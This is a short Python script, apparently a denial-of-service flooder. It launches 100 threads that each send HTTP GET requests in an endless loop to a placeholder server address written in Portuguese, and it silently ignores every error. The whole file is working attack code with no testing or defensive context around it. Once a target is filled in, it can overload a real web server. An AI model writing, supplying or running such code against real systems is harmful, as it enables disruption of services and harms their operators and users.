import requests
import threading
import time

def flood():
    while True:
        try:
            requests.get("ENDEREÇO_DO_SERVIDOR", timeout=1)
        except:
            pass

for _ in range(100):
    t = threading.Thread(target=flood)
    t.start()